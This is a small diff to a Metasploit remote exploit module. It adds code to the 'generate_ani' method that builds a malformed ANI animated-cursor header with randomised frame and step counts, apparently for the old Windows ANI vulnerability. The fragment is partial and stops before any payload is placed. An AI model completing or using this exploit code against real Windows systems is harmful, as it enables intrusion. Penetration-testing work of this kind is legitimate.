@@ -199,7 +199,19 @@ class MetasploitModule < Msf::Exploit::Remote
   # Windows. It's based on the RIFF (Resoursce Interchange File Format)
   # 
   def generate_ani(payload, target)
+    # Build the first ANI header (to better understand these values, visit
+    # http://blog.cloppert.org/2007/04/bit-of-help-on-ms-ani-exploit.html
+    anih_a = [
+      36,             # DWORD cbSizeof
+      rand(128)+16,   # DWORD cFrames
+      rand(1024)+1,   # DWORD cSteps
+      0,              # DWORD cx,cy (reserved - 0)
+      0,              # DWORD cBitCount, cPlanes (reserved - 0)
+      0, 0, 0,        # JIF jifRate
+      1
+    ].pack('V9')
 
+    anih_b = nil
   end
 
   #
